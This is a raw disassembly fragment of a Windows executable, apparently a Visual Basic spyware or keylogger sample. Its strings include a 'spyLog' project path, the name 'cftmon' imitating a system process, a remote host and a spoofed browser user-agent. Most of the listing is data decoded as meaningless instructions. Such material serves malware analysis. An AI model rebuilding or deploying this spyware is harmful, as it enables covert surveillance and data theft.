  40179c:	00 15 09 00 00 46    	add    %dl,0x46000009
  4017a2:	02 ff                	add    %bh,%bh
  4017a4:	01 1f                	add    %ebx,(%edi)
  4017a6:	00 00                	add    %al,(%eax)
  4017a8:	00 01                	add    %al,(%ecx)
  4017aa:	06                   	push   %es
  4017ab:	00 74 5f 73          	add    %dh,0x73(%edi,%ebx,2)
  4017af:	61                   	popa
  4017b0:	76 65                	jbe    0x401817
  4017b2:	00 0b                	add    %cl,(%ebx)
  4017b4:	03 60 ea             	add    -0x16(%eax),%esp
  4017b7:	00 00                	add    %al,(%eax)
  4017b9:	07                   	pop    %es
  4017ba:	78 00                	js     0x4017bc
  4017bc:	00 00                	add    %al,(%eax)
  4017be:	08 b4 00 00 00 ff 03 	or     %dh,0x3ff0000(%eax,%eax,1)
  4017c5:	1f                   	pop    %ds
  4017c6:	00 00                	add    %al,(%eax)
  4017c8:	00 02                	add    %al,(%edx)
  4017ca:	06                   	push   %es
  4017cb:	00 54 69 6d          	add    %dl,0x6d(%ecx,%ebp,2)
  4017cf:	65 72 31             	gs jb  0x401803
  4017d2:	00 0b                	add    %cl,(%ebx)
  4017d4:	03 01                	add    (%ecx),%eax
  4017d6:	00 00                	add    %al,(%eax)
  4017d8:	00 07                	add    %al,(%edi)
  4017da:	1c 02                	sbb    $0x2,%al
  4017dc:	00 00                	add    %al,(%eax)
  4017de:	08 b4 00 00 00 ff 03 	or     %dh,0x3ff0000(%eax,%eax,1)
  4017e5:	33 00                	xor    (%eax),%eax
  4017e7:	00 00                	add    %al,(%eax)
  4017e9:	03 05 00 54 65 78    	add    0x78655400,%eax
  4017ef:	74 31                	je     0x401822
  4017f1:	00 02                	add    %al,(%edx)
  4017f3:	04 3c                	add    $0x3c,%al
  4017f5:	00 78 00             	add    %bh,0x0(%eax)
  4017f8:	cf                   	iret
  4017f9:	12 43 08             	adc    0x8(%ebx),%al
  4017fc:	12 00                	adc    (%eax),%al
  4017fe:	00 17                	add    %dl,(%edi)
  401800:	ff 18                	lcall  *(%eax)
  401802:	02 2d ff 2e 01 00    	add    0x12eff,%ch
  401808:	00 00                	add    %al,(%eax)
  40180a:	90                   	nop
  40180b:	01 90 5f 01 00 06    	add    %edx,0x600015f(%eax)
  401811:	54                   	push   %esp
  401812:	61                   	popa
  401813:	68 6f 6d 61 ff       	push   $0xff616d6f
  401818:	03 36                	add    (%esi),%esi
  40181a:	00 00                	add    %al,(%eax)
  40181c:	00 04 07             	add    %al,(%edi,%eax,1)
  40181f:	00 6c 62 6c          	add    %ch,0x6c(%edx,%eiz,2)
  401823:	44                   	inc    %esp
  401824:	61                   	popa
  401825:	74 61                	je     0x401888
  401827:	00 01                	add    %al,(%ecx)
  401829:	04 ff                	add    $0xff,%al
  40182b:	ff                   	(bad)
  40182c:	ff 00                	incl   (%eax)
  40182e:	05 3c 00 24 09       	add    $0x924003c,%eax
  401833:	cf                   	iret
  401834:	12 77 01             	adc    0x1(%edi),%dh
  401837:	12 01                	adc    (%ecx),%al
  401839:	00 1f                	add    %bl,(%edi)
  40183b:	00 25 01 00 00 00    	add    %ah,0x1
  401841:	90                   	nop
  401842:	01 90 5f 01 00 06    	add    %edx,0x600015f(%eax)
  401848:	54                   	push   %esp
  401849:	61                   	popa
  40184a:	68 6f 6d 61 ff       	push   $0xff616d6f
  40184f:	02 04 00             	add    (%eax,%eax,1),%al
  401852:	00 00                	add    %al,(%eax)
  401854:	06                   	push   %es
  401855:	00 00                	add    %al,(%eax)
  401857:	00 00                	add    %al,(%eax)
  401859:	2b 40 00             	sub    0x0(%eax),%eax
  40185c:	07                   	pop    %es
  40185d:	00 00                	add    %al,(%eax)
  40185f:	00 14 24             	add    %dl,(%esp)
  401862:	40                   	inc    %eax
  401863:	00 07                	add    %al,(%edi)
  401865:	00 00                	add    %al,(%eax)
  401867:	00 cc                	add    %cl,%ah
  401869:	23 40 00             	and    0x0(%eax),%eax
  40186c:	07                   	pop    %es
  40186d:	00 00                	add    %al,(%eax)
  40186f:	00 80 23 40 00 07    	add    %al,0x7004023(%eax)
  401875:	00 00                	add    %al,(%eax)
  401877:	00 28                	add    %ch,(%eax)
  401879:	23 40 00             	and    0x0(%eax),%eax
  40187c:	07                   	pop    %es
  40187d:	00 00                	add    %al,(%eax)
  40187f:	00 dc                	add    %bl,%ah
  401881:	22 40 00             	and    0x0(%eax),%al
  401884:	07                   	pop    %es
  401885:	00 00                	add    %al,(%eax)
  401887:	00 a4 22 40 00 07 00 	add    %ah,0x70040(%edx,%eiz,1)
  40188e:	00 00                	add    %al,(%eax)
  401890:	48                   	dec    %eax
  401891:	22 40 00             	and    0x0(%eax),%al
  401894:	07                   	pop    %es
  401895:	00 00                	add    %al,(%eax)
  401897:	00 fc                	add    %bh,%ah
  401899:	21 40 00             	and    %eax,0x0(%eax)
  40189c:	50                   	push   %eax
  40189d:	00 00                	add    %al,(%eax)
  40189f:	00 8d 06 21 56 8d    	add    %cl,-0x72a9defa(%ebp)
  4018a5:	3c 35                	cmp    $0x35,%al
  4018a7:	4c                   	dec    %esp
  4018a8:	ab                   	stos   %eax,%es:(%edi)
  4018a9:	17                   	pop    %ss
  4018aa:	1f                   	pop    %ds
  4018ab:	43                   	inc    %ebx
  4018ac:	57                   	push   %edi
  4018ad:	56                   	push   %esi
  4018ae:	79 17                	jns    0x4018c7
	...
  4018c4:	10 02                	adc    %al,(%edx)
	...
  4018da:	00 00                	add    %al,(%eax)
  4018dc:	99                   	cltd
  4018dd:	05 00 00 00 00       	add    $0x0,%eax
  4018e2:	00 00                	add    %al,(%eax)
  4018e4:	b8 12 40 00 4c       	mov    $0x4c004012,%eax
  4018e9:	00 00                	add    %al,(%eax)
  4018eb:	00 56 42             	add    %dl,0x42(%esi)
  4018ee:	35 21 f0 1f 2a       	xor    $0x2a1ff021,%eax
	...
  4018ff:	00 7e 00             	add    %bh,0x0(%esi)
	...
  40190e:	0a 00                	or     (%eax),%al
  401910:	10 04 00             	adc    %al,(%eax,%eax,1)
	...
  40191b:	00 80 19 40 00 06    	add    %al,0x6004019(%eax)
  401921:	f8                   	clc
  401922:	30 00                	xor    %al,(%eax)
  401924:	00 ff                	add    %bh,%bh
  401926:	ff                   	(bad)
  401927:	ff 08                	decl   (%eax)
  401929:	00 00                	add    %al,(%eax)
  40192b:	00 01                	add    %al,(%ecx)
  40192d:	00 00                	add    %al,(%eax)
  40192f:	00 01                	add    %al,(%ecx)
  401931:	00 00                	add    %al,(%eax)
  401933:	00 e9                	add    %ch,%cl
  401935:	00 00                	add    %al,(%eax)
  401937:	00 9c 18 40 00 54 18 	add    %bl,0x18540040(%eax,%ebx,1)
  40193e:	40                   	inc    %eax
  40193f:	00 64 12 40          	add    %ah,0x40(%edx,%edx,1)
  401943:	00 78 00             	add    %bh,0x0(%eax)
  401946:	00 00                	add    %al,(%eax)
  401948:	7f 00                	jg     0x40194a
  40194a:	00 00                	add    %al,(%eax)
  40194c:	8b 00                	mov    (%eax),%eax
  40194e:	00 00                	add    %al,(%eax)
  401950:	8c 00                	mov    %es,(%eax)
	...
  401962:	00 00                	add    %al,(%eax)
  401964:	63 66 74             	arpl   %esp,0x74(%esi)
  401967:	6d                   	insl   (%dx),%es:(%edi)
  401968:	6f                   	outsl  %ds:(%esi),(%dx)
  401969:	6e                   	outsb  %ds:(%esi),(%dx)
  40196a:	00 63 66             	add    %ah,0x66(%ebx)
  40196d:	74 6d                	je     0x4019dc
  40196f:	6f                   	outsl  %ds:(%esi),(%dx)
  401970:	6e                   	outsb  %ds:(%esi),(%dx)
  401971:	20 76 32             	and    %dh,0x32(%esi)
  401974:	2e 36 00 00          	cs add %al,%ss:(%eax)
  401978:	63 66 74             	arpl   %esp,0x74(%esi)
  40197b:	6d                   	insl   (%dx),%es:(%edi)
  40197c:	6f                   	outsl  %ds:(%esi),(%dx)
  40197d:	6e                   	outsb  %ds:(%esi),(%dx)
  40197e:	00 00                	add    %al,(%eax)
  401980:	f4                   	hlt
  401981:	01 00                	add    %eax,(%eax)
  401983:	00 0c 1f             	add    %cl,(%edi,%ebx,1)
  401986:	40                   	inc    %eax
  401987:	00 00                	add    %al,(%eax)
  401989:	00 00                	add    %al,(%eax)
  40198b:	00 10                	add    %dl,(%eax)
  40198d:	2c 40                	sub    $0x40,%al
  40198f:	00 40 63             	add    %al,0x63(%eax)
  401992:	40                   	inc    %eax
  401993:	00 54 0a 00          	add    %dl,0x0(%edx,%ecx,1)
  401997:	00 08                	add    %cl,(%eax)
  401999:	70 40                	jo     0x4019db
  40199b:	00 26                	add    %ah,(%esi)
  40199d:	11 40 00             	adc    %eax,0x0(%eax)
  4019a0:	00 70 40             	add    %dh,0x40(%eax)
  4019a3:	00 2a                	add    %ch,(%edx)
  4019a5:	00 5c 00 41          	add    %bl,0x41(%eax,%eax,1)
  4019a9:	00 46 00             	add    %al,0x0(%esi)
  4019ac:	3a 00                	cmp    (%eax),%al
  4019ae:	5c                   	pop    %esp
  4019af:	00 73 00             	add    %dh,0x0(%ebx)
  4019b2:	70 00                	jo     0x4019b4
  4019b4:	79 00                	jns    0x4019b6
  4019b6:	4c                   	dec    %esp
  4019b7:	00 6f 00             	add    %ch,0x0(%edi)
  4019ba:	67 00 5c 00          	add    %bl,0x0(%si)
  4019be:	63 00                	arpl   %eax,(%eax)
  4019c0:	66 00 74 00 6d       	data16 add %dh,0x6d(%eax,%eax,1)
  4019c5:	00 6f 00             	add    %ch,0x0(%edi)
  4019c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4019c9:	00 5f 00             	add    %bl,0x0(%edi)
  4019cc:	76 00                	jbe    0x4019ce
  4019ce:	33 00                	xor    (%eax),%eax
  4019d0:	2e 00 33             	add    %dh,%cs:(%ebx)
  4019d3:	00 5f 00             	add    %bl,0x0(%edi)
  4019d6:	68 00 74 00 74       	push   $0x74007400
  4019db:	00 70 00             	add    %dh,0x0(%eax)
  4019de:	5c                   	pop    %esp
  4019df:	00 63 00             	add    %ah,0x0(%ebx)
  4019e2:	66 00 74 00 6d       	data16 add %dh,0x6d(%eax,%eax,1)
  4019e7:	00 6f 00             	add    %ch,0x0(%edi)
  4019ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4019eb:	00 2e                	add    %ch,(%esi)
  4019ed:	00 76 00             	add    %dh,0x0(%esi)
  4019f0:	62 00                	bound  %eax,(%eax)
  4019f2:	70 00                	jo     0x4019f4
	...
  401bb4:	54                   	push   %esp
  401bb5:	18 40 00             	sbb    %al,0x0(%eax)
  401bb8:	09 00                	or     %eax,(%eax)
  401bba:	00 00                	add    %al,(%eax)
  401bbc:	01 00                	add    %eax,(%eax)
  401bbe:	00 00                	add    %al,(%eax)
  401bc0:	0c 1f                	or     $0x1f,%al
  401bc2:	40                   	inc    %eax
  401bc3:	00 00                	add    %al,(%eax)
  401bc5:	00 00                	add    %al,(%eax)
  401bc7:	00 5c 2b 40          	add    %bl,0x40(%ebx,%ebp,1)
  401bcb:	00 ff                	add    %bh,%bh
  401bcd:	ff                   	(bad)
  401bce:	ff                   	(bad)
  401bcf:	ff 00                	incl   (%eax)
  401bd1:	00 00                	add    %al,(%eax)
  401bd3:	00 60 1f             	add    %ah,0x1f(%eax)
  401bd6:	40                   	inc    %eax
  401bd7:	00 08                	add    %cl,(%eax)
  401bd9:	70 40                	jo     0x401c1b
  401bdb:	00 08                	add    %cl,(%eax)
  401bdd:	00 00                	add    %al,(%eax)
  401bdf:	00 34 1c             	add    %dh,(%esp,%ebx,1)
  401be2:	40                   	inc    %eax
	...
  401bef:	00 34 1c             	add    %dh,(%esp,%ebx,1)
  401bf2:	40                   	inc    %eax
  401bf3:	00 01                	add    %al,(%ecx)
  401bf5:	00 00                	add    %al,(%eax)
  401bf7:	00 b4 20 40 00 00 00 	add    %dh,0x40(%eax,%eiz,1)
  401bfe:	00 00                	add    %al,(%eax)
  401c00:	54                   	push   %esp
  401c01:	1c 40                	sbb    $0x40,%al
  401c03:	00 01                	add    %al,(%ecx)
  401c05:	00 00                	add    %al,(%eax)
  401c07:	00 5c 1c 40          	add    %bl,0x40(%esp,%ebx,1)
  401c0b:	00 00                	add    %al,(%eax)
  401c0d:	00 00                	add    %al,(%eax)
  401c0f:	00 58 1c             	add    %bl,0x1c(%eax)
  401c12:	40                   	inc    %eax
  401c13:	00 05 00 00 00 5c    	add    %al,0x5c000000
  401c19:	1c 40                	sbb    $0x40,%al
  401c1b:	00 04 00             	add    %al,(%eax,%eax,1)
  401c1e:	b7 01                	mov    $0x1,%bh
  401c20:	68 00 6c 00 24       	push   $0x24006c00
  401c25:	1d 40 00 48 73       	sbb    $0x73480040,%eax
  401c2a:	40                   	inc    %eax
  401c2b:	00 00                	add    %al,(%eax)
  401c2d:	00 00                	add    %al,(%eax)
  401c2f:	00 7c c8 84          	add    %bh,-0x7c(%eax,%ecx,8)
  401c33:	00 4c 3a af          	add    %cl,-0x51(%edx,%edi,1)
  401c37:	77 98                	ja     0x401bd1
  401c39:	33 af 77 00 00 00    	xor    0x77(%edi),%ebp
	...
  401c4f:	00 cc                	add    %cl,%ah
  401c51:	39 af 77 c4 20 40    	cmp    %ebp,0x4020c477(%edi)
  401c57:	00 d4                	add    %dl,%ah
  401c59:	20 40 00             	and    %al,0x0(%eax)
  401c5c:	40                   	inc    %eax
  401c5d:	00 1f                	add    %bl,(%edi)
  401c5f:	00 3c 00             	add    %bh,(%eax,%eax,1)
  401c62:	00 00                	add    %al,(%eax)
  401c64:	e4 20                	in     $0x20,%al
  401c66:	40                   	inc    %eax
  401c67:	00 ff                	add    %bh,%bh
  401c69:	ff                   	(bad)
  401c6a:	ff                   	(bad)
  401c6b:	ff 00                	incl   (%eax)
  401c6d:	00 00                	add    %al,(%eax)
  401c6f:	00 00                	add    %al,(%eax)
  401c71:	00 00                	add    %al,(%eax)
  401c73:	00 34 1d 40 00 b4 cb 	add    %dh,-0x344bffc0(,%ebx,1)
  401c7a:	84 00                	test   %al,(%eax)
  401c7c:	f4                   	hlt
  401c7d:	20 40 00             	and    %al,0x0(%eax)
  401c80:	ff                   	(bad)
  401c81:	ff                   	(bad)
  401c82:	ff                   	(bad)
  401c83:	ff 40 00             	incl   0x0(%eax)
  401c86:	12 00                	adc    (%eax),%al
  401c88:	40                   	inc    %eax
  401c89:	00 00                	add    %al,(%eax)
  401c8b:	00 8c 21 40 00 04 00 	add    %cl,0x40040(%ecx,%eiz,1)
  401c92:	03 00                	add    (%eax),%eax
	...
  401c9c:	c8 1d 40 00          	enter  $0x401d,$0x0
  401ca0:	c4                   	(bad)
  401ca1:	cb                   	lret
  401ca2:	84 00                	test   %al,(%eax)
  401ca4:	9c                   	pushf
  401ca5:	21 40 00             	and    %eax,0x0(%eax)
  401ca8:	04 00                	add    $0x0,%al
  401caa:	03 00                	add    (%eax),%eax
  401cac:	40                   	inc    %eax
  401cad:	00 01                	add    %al,(%ecx)
  401caf:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  401cb3:	00 a4 21 40 00 02 00 	add    %ah,0x20040(%ecx,%eiz,1)
  401cba:	03 00                	add    (%eax),%eax
	...
  401cc4:	28 1e                	sub    %bl,(%esi)
  401cc6:	40                   	inc    %eax
  401cc7:	00 d4                	add    %dl,%ah
  401cc9:	cb                   	lret
  401cca:	84 00                	test   %al,(%eax)
  401ccc:	b4 21                	mov    $0x21,%ah
  401cce:	40                   	inc    %eax
  401ccf:	00 02                	add    %al,(%edx)
  401cd1:	00 03                	add    %al,(%ebx)
  401cd3:	00 40 00             	add    %al,0x0(%eax)
  401cd6:	01 00                	add    %eax,(%eax)
  401cd8:	48                   	dec    %eax
  401cd9:	00 00                	add    %al,(%eax)
  401cdb:	00 a4 21 40 00 01 00 	add    %ah,0x10040(%ecx,%eiz,1)
  401ce2:	03 00                	add    (%eax),%eax
	...
  401cec:	44                   	inc    %esp
  401ced:	1e                   	push   %ds
  401cee:	40                   	inc    %eax
  401cef:	00 d4                	add    %dl,%ah
  401cf1:	cb                   	lret
  401cf2:	84 00                	test   %al,(%eax)
  401cf4:	bc 21 40 00 01       	mov    $0x1004021,%esp
  401cf9:	00 03                	add    %al,(%ebx)
  401cfb:	00 40 00             	add    %al,0x0(%eax)
  401cfe:	18 00                	sbb    %al,(%eax)
  401d00:	4c                   	dec    %esp
  401d01:	00 00                	add    %al,(%eax)
  401d03:	00 c4                	add    %al,%ah
  401d05:	21 40 00             	and    %eax,0x0(%eax)
  401d08:	03 00                	add    (%eax),%eax
  401d0a:	03 00                	add    (%eax),%eax
	...
  401d14:	60                   	pusha
  401d15:	1e                   	push   %ds
  401d16:	40                   	inc    %eax
  401d17:	00 e4                	add    %ah,%ah
  401d19:	cb                   	lret
  401d1a:	84 00                	test   %al,(%eax)
  401d1c:	d4 21                	aam    $0x21
  401d1e:	40                   	inc    %eax
  401d1f:	00 03                	add    %al,(%ebx)
  401d21:	00 03                	add    %al,(%ebx)
  401d23:	00 e0                	add    %ah,%al
  401d25:	1e                   	push   %ds
  401d26:	40                   	inc    %eax
  401d27:	00 ed                	add    %ch,%ch
  401d29:	1e                   	push   %ds
  401d2a:	40                   	inc    %eax
  401d2b:	00 fa                	add    %bh,%dl
  401d2d:	1e                   	push   %ds
  401d2e:	40                   	inc    %eax
  401d2f:	00 07                	add    %al,(%edi)
  401d31:	1f                   	pop    %ds
  401d32:	40                   	inc    %eax
  401d33:	00 00                	add    %al,(%eax)
  401d35:	00 00                	add    %al,(%eax)
  401d37:	00 5c 1c 40          	add    %bl,0x40(%esp,%ebx,1)
  401d3b:	00 bc 1b 40 00 40 12 	add    %bh,0x12400040(%ebx,%ebx,1)
  401d42:	40                   	inc    %eax
  401d43:	00 46 12             	add    %al,0x12(%esi)
  401d46:	40                   	inc    %eax
  401d47:	00 4c 12 40          	add    %cl,0x40(%edx,%edx,1)
	...
  401d63:	00 d8                	add    %bl,%al
  401d65:	1e                   	push   %ds
  401d66:	40                   	inc    %eax
	...
  401dcb:	00 84 1c 40 00 bc 1b 	add    %al,0x1bbc0040(%esp,%ebx,1)
  401dd2:	40                   	inc    %eax
  401dd3:	00 40 12             	add    %al,0x12(%eax)
  401dd6:	40                   	inc    %eax
  401dd7:	00 46 12             	add    %al,0x12(%esi)
  401dda:	40                   	inc    %eax
  401ddb:	00 4c 12 40          	add    %cl,0x40(%edx,%edx,1)
	...
  401e2b:	00 ac 1c 40 00 bc 1b 	add    %ch,0x1bbc0040(%esp,%ebx,1)
  401e32:	40                   	inc    %eax
  401e33:	00 40 12             	add    %al,0x12(%eax)
  401e36:	40                   	inc    %eax
  401e37:	00 46 12             	add    %al,0x12(%esi)
  401e3a:	40                   	inc    %eax
  401e3b:	00 4c 12 40          	add    %cl,0x40(%edx,%edx,1)
  401e3f:	00 ff                	add    %bh,%bh
  401e41:	1e                   	push   %ds
  401e42:	40                   	inc    %eax
  401e43:	00 00                	add    %al,(%eax)
  401e45:	00 00                	add    %al,(%eax)
  401e47:	00 d4                	add    %dl,%ah
  401e49:	1c 40                	sbb    $0x40,%al
  401e4b:	00 bc 1b 40 00 40 12 	add    %bh,0x12400040(%ebx,%ebx,1)
  401e52:	40                   	inc    %eax
  401e53:	00 46 12             	add    %al,0x12(%esi)
  401e56:	40                   	inc    %eax
  401e57:	00 4c 12 40          	add    %cl,0x40(%edx,%edx,1)
  401e5b:	00 e5                	add    %ah,%ch
  401e5d:	1e                   	push   %ds
  401e5e:	40                   	inc    %eax
  401e5f:	00 00                	add    %al,(%eax)
  401e61:	00 00                	add    %al,(%eax)
  401e63:	00 fc                	add    %bh,%ah
  401e65:	1c 40                	sbb    $0x40,%al
  401e67:	00 bc 1b 40 00 40 12 	add    %bh,0x12400040(%ebx,%ebx,1)
  401e6e:	40                   	inc    %eax
  401e6f:	00 46 12             	add    %al,0x12(%esi)
  401e72:	40                   	inc    %eax
  401e73:	00 4c 12 40          	add    %cl,0x40(%edx,%edx,1)
  401e77:	00 f2                	add    %dh,%dl
  401e79:	1e                   	push   %ds
  401e7a:	40                   	inc    %eax
	...
  401ed7:	00 81 6c 24 04 3b    	add    %al,0x3b04246c(%ecx)
  401edd:	00 00                	add    %al,(%eax)
  401edf:	00 e9                	add    %ch,%cl
  401ee1:	3b 0d 00 00 81 6c    	cmp    0x6c810000,%ecx
  401ee7:	24 04                	and    $0x4,%al
  401ee9:	47                   	inc    %edi
  401eea:	00 00                	add    %al,(%eax)
  401eec:	00 e9                	add    %ch,%cl
  401eee:	9e                   	sahf
  401eef:	0e                   	push   %cs
  401ef0:	00 00                	add    %al,(%eax)
  401ef2:	81 6c 24 04 4b 00 00 	subl   $0x4b,0x4(%esp)
  401ef9:	00 
  401efa:	e9 d1 11 00 00       	jmp    0x4030d0
  401eff:	81 6c 24 04 43 00 00 	subl   $0x43,0x4(%esp)
  401f06:	00 
  401f07:	e9 34 13 00 00       	jmp    0x403240
  401f0c:	00 00                	add    %al,(%eax)
  401f0e:	00 00                	add    %al,(%eax)
  401f10:	2c 70                	sub    $0x70,%al
  401f12:	40                   	inc    %eax
  401f13:	00 9c 2b 40 00 ff ff 	add    %bl,-0xffc0(%ebx,%ebp,1)
  401f1a:	ff                   	(bad)
  401f1b:	ff 00                	incl   (%eax)
  401f1d:	00 00                	add    %al,(%eax)
  401f1f:	00 1c 70             	add    %bl,(%eax,%esi,2)
  401f22:	40                   	inc    %eax
  401f23:	00 99 a2 af 00 86    	add    %bl,-0x79ff505e(%ecx)
  401f29:	e3 d4                	jecxz  0x401eff
  401f2b:	4e                   	dec    %esi
  401f2c:	b4 f8                	mov    $0xf8,%ah
  401f2e:	f2 1e                	repnz push %ds
  401f30:	49                   	dec    %ecx
  401f31:	96                   	xchg   %eax,%esi
  401f32:	43                   	inc    %ebx
  401f33:	80 0a 00             	orb    $0x0,(%edx)
  401f36:	01 00                	add    %eax,(%eax)
  401f38:	04 00                	add    $0x0,%al
  401f3a:	01 00                	add    %eax,(%eax)
  401f3c:	60                   	pusha
  401f3d:	1f                   	pop    %ds
  401f3e:	40                   	inc    %eax
	...
  401f4b:	00 c4                	add    %al,%ah
  401f4d:	1f                   	pop    %ds
  401f4e:	40                   	inc    %eax
  401f4f:	00 09                	add    %cl,(%ecx)
  401f51:	04 00                	add    $0x0,%al
  401f53:	00 10                	add    %dl,(%eax)
  401f55:	04 00                	add    $0x0,%al
  401f57:	00 00                	add    %al,(%eax)
  401f59:	00 00                	add    %al,(%eax)
  401f5b:	00 02                	add    %al,(%edx)
  401f5d:	00 00                	add    %al,(%eax)
  401f5f:	00 bc 1b 40 00 ff ff 	add    %bh,-0xffc0(%ebx,%ebx,1)
  401f66:	ff                   	(bad)
  401f67:	ff 48 24             	decl   0x24(%eax)
  401f6a:	40                   	inc    %eax
	...
  401f77:	00 cc                	add    %cl,%ah
  401f79:	1f                   	pop    %ds
  401f7a:	40                   	inc    %eax
  401f7b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  401f7e:	00 00                	add    %al,(%eax)
  401f80:	90                   	nop
  401f81:	1f                   	pop    %ds
  401f82:	40                   	inc    %eax
  401f83:	00 ff                	add    %bh,%bh
  401f85:	ff 00                	incl   (%eax)
  401f87:	00 83 80 01 00 00    	add    %al,0x180(%ebx)
	...
  401fc1:	00 00                	add    %al,(%eax)
  401fc3:	00 63 66             	add    %ah,0x66(%ebx)
  401fc6:	74 6d                	je     0x402035
  401fc8:	6f                   	outsl  %ds:(%esi),(%dx)
  401fc9:	6e                   	outsb  %ds:(%esi),(%dx)
  401fca:	00 00                	add    %al,(%eax)
  401fcc:	66 72 6d             	data16 jb 0x40203c
  401fcf:	4d                   	dec    %ebp
  401fd0:	61                   	popa
  401fd1:	69 6e 00 2e 00 00 00 	imul   $0x2e,0x0(%esi),%ebp
  401fd8:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  401fdc:	6a 00                	push   $0x0
  401fde:	69 00 6e 00 61 00    	imul   $0x61006e,(%eax),%eax
  401fe4:	6d                   	insl   (%dx),%es:(%edi)
  401fe5:	00 61 00             	add    %ah,0x0(%ecx)
  401fe8:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  401fec:	6c                   	insb   (%dx),%es:(%edi)
  401fed:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  401ff1:	00 72 00             	add    %dh,0x0(%edx)
  401ff4:	76 00                	jbe    0x401ff6
  401ff6:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  401ffc:	61                   	popa
  401ffd:	00 2e                	add    %ch,(%esi)
  401fff:	00 6f 00             	add    %ch,0x0(%edi)
  402002:	72 00                	jb     0x402004
  402004:	67 00 00             	add    %al,(%bx,%si)
  402007:	00 96 00 00 00 4d    	add    %dl,0x4d000000(%esi)
  40200d:	00 6f 00             	add    %ch,0x0(%edi)
  402010:	7a 00                	jp     0x402012
  402012:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  402018:	61                   	popa
  402019:	00 2f                	add    %ch,(%edi)
  40201b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40201e:	2e 00 30             	add    %dh,%cs:(%eax)
  402021:	00 20                	add    %ah,(%eax)
  402023:	00 28                	add    %ch,(%eax)
  402025:	00 63 00             	add    %ah,0x0(%ebx)
  402028:	6f                   	outsl  %ds:(%esi),(%dx)
  402029:	00 6d 00             	add    %ch,0x0(%ebp)
  40202c:	70 00                	jo     0x40202e
  40202e:	61                   	popa
  40202f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  402033:	00 62 00             	add    %ah,0x0(%edx)
  402036:	6c                   	insb   (%dx),%es:(%edi)
  402037:	00 65 00             	add    %ah,0x0(%ebp)
  40203a:	3b 00                	cmp    (%eax),%eax
  40203c:	20 00                	and    %al,(%eax)
  40203e:	4d                   	dec    %ebp
  40203f:	00 53 00             	add    %dl,0x0(%ebx)
  402042:	49                   	dec    %ecx
  402043:	00 45 00             	add    %al,0x0(%ebp)
  402046:	20 00                	and    %al,(%eax)
  402048:	37                   	aaa
  402049:	00 2e                	add    %ch,(%esi)
  40204b:	00 30                	add    %dh,(%eax)
  40204d:	00 3b                	add    %bh,(%ebx)
  40204f:	00 20                	add    %ah,(%eax)
  402051:	00 57 00             	add    %dl,0x0(%edi)
  402054:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40205a:	6f                   	outsl  %ds:(%esi),(%dx)
  40205b:	00 77 00             	add    %dh,0x0(%edi)
  40205e:	73 00                	jae    0x402060
  402060:	20 00                	and    %al,(%eax)
  402062:	4e                   	dec    %esi
  402063:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  402067:	00 35 00 2e 00 31    	add    %dh,0x31002e00
  40206d:	00 3b                	add    %bh,(%ebx)
  40206f:	00 20                	add    %ah,(%eax)
  402071:	00 53 00             	add    %dl,0x0(%ebx)
  402074:	56                   	push   %esi
  402075:	00 31                	add    %dh,(%ecx)
  402077:	00 3b                	add    %bh,(%ebx)
  402079:	00 20                	add    %ah,(%eax)
  40207b:	00 2e                	add    %ch,(%esi)
  40207d:	00 4e 00             	add    %cl,0x0(%esi)
  402080:	45                   	inc    %ebp
  402081:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  402085:	00 43 00             	add    %al,0x0(%ebx)
  402088:	4c                   	dec    %esp
  402089:	00 52 00             	add    %dl,0x0(%edx)
  40208c:	20 00                	and    %al,(%eax)
  40208e:	32 00                	xor    (%eax),%al
  402090:	2e 00 30             	add    %dh,%cs:(%eax)
  402093:	00 2e                	add    %ch,(%esi)
  402095:	00 35 00 30 00 37    	add    %dh,0x37003000
  40209b:	00 32                	add    %dh,(%edx)
  40209d:	00 37                	add    %dh,(%edi)
  40209f:	00 29                	add    %ch,(%ecx)
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	00 08                	add    %cl,(%eax)
  4020a5:	35 b4 a4 1d b6       	xor    $0xb61da4b4,%eax
  4020aa:	ce                   	into
  4020ab:	40                   	inc    %eax
  4020ac:	ac                   	lods   %ds:(%esi),%al
  4020ad:	52                   	push   %edx
  4020ae:	95                   	xchg   %eax,%ebp
  4020af:	27                   	daa
  4020b0:	40                   	inc    %eax
  4020b1:	b8 0c 45 32 5f       	mov    $0x5f32450c,%eax
  4020b6:	71 06                	jno    0x4020be
  4020b8:	e0 12                	loopne 0x4020cc
  4020ba:	6b 4f 82 74          	imul   $0x74,-0x7e(%edi),%ecx
  4020be:	1c fa                	sbb    $0xfa,%al
  4020c0:	77 3f                	ja     0x402101
  4020c2:	81 c0 8d 06 21 56    	add    $0x5621068d,%eax
  4020c8:	8d 3c 35 4c ab 17 1f 	lea    0x1f17ab4c(,%esi,1),%edi
  4020cf:	43                   	inc    %ebx
  4020d0:	57                   	push   %edi
  4020d1:	56                   	push   %esi
  4020d2:	79 17                	jns    0x4020eb
  4020d4:	cd 67                	int    $0x67
  4020d6:	93                   	xchg   %eax,%ebx
  4020d7:	36 04 cf             	ss add $0xcf,%al
  4020da:	6c                   	insb   (%dx),%es:(%edi)
  4020db:	40                   	inc    %eax
  4020dc:	b0 ae                	mov    $0xae,%al
  4020de:	4e                   	dec    %esi
  4020df:	63 ae d6 d9 9f 3a    	arpl   %ebp,0x3a9fd9d6(%esi)
  4020e5:	4f                   	dec    %edi
  4020e6:	ad                   	lods   %ds:(%esi),%eax
  4020e7:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  4020ed:	0c 00                	or     $0x0,%al
  4020ef:	aa                   	stos   %al,%es:(%edi)
  4020f0:	00 60 d3             	add    %ah,-0x2d(%eax)
  4020f3:	93                   	xchg   %eax,%ebx
  4020f4:	46                   	inc    %esi
  4020f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4020f6:	72 6d                	jb     0x402165
